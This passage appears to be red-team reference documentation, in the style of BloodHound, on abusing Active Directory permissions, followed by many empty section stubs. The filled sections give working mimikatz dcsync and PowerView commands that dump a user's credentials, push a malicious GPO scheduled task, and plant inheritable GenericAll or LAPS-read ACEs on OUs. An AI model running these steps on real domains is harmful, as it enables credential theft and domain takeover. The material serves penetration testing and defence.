**With GenericAll Over a Domain Object**

Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All
rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the
credential of the user harmj0y using these rights:

::

  lsadump::dcsync /domain:testlab.local /user:harmj0y

**With GenericAll Over a GPO**

With full control of a GPO, you may make modifications to that GPO which will then apply to the users and
computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use
the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new
immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute
the new evil policy. See the references tab for a more detailed write up on this abuse

**With GenericAll Over an OU**

With full control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that
OU. Below are two options depending on how targeted you choose to be in this step:

Generic Descendent Object Takeover:

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU
that will inherit down to all object types. Again, this can be done using PowerView. This time we will use
the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.

First, we need to reference the OU by its ObjectGUID, not its name. You can find the ObjectGUID for the OU
in the BloodHound GUI by clicking the OU, then inspecting the *objectid* value

Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':

::

  $Guids = Get-DomainGUIDMap
  $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name

Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of
all descendant objects:

::

  ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid

Finally, we will apply this ACE to our target OU:

::

  $OU = Get-DomainOU -Raw (OU GUID)
  $DsEntry = $OU.GetDirectoryEntry()
  $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
  $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
  $dsEntry.PsBase.CommitChanges()</code>

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever:

If you want to be more targeted with your approach, it is possible to specify precisely what right you want
to apply to precisely which kinds of descendent objects. You could, for example, grant a user
"ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every
GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the
"ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:

::

  $Guids = Get-DomainGUIDMap
  $AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
  $CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
  $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
  $OU = Get-DomainOU -Raw Workstations
  $DsEntry = $OU.GetDirectoryEntry()
  $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
  $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
  $dsEntry.PsBase.CommitChanges()

Opsec Considerations
--------------------

..todo:: Add opsec considerations here

References
----------

* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
* https://www.youtube.com/watch?v=z8thoG7gPd0
* https://adsecurity.org/?p=1729
* http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/
* https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e
* https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
* https://github.com/GhostPack/Rubeus#s4u
* https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
* http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
* https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
* https://github.com/Kevin-Robertson/Powermad#new-machineaccount

WriteDacl
^^^^^^^^^

With write access to the target object's DACL, you can grant yourself any privilege you want
on the object.

AbuseInfo
---------

..todo:: write this

Opsec Considerations
--------------------

References
----------

GenericWrite
^^^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

WriteOwner
^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

Owns
^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

Contains
^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

AllExtendedRights
^^^^^^^^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

GpLink
^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

WriteOwner
^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

AllowedToAct
^^^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

AddAllowedToAct
^^^^^^^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------

TrustedBy
^^^^^^^^^

AbuseInfo
---------

Opsec Considerations
--------------------

References
----------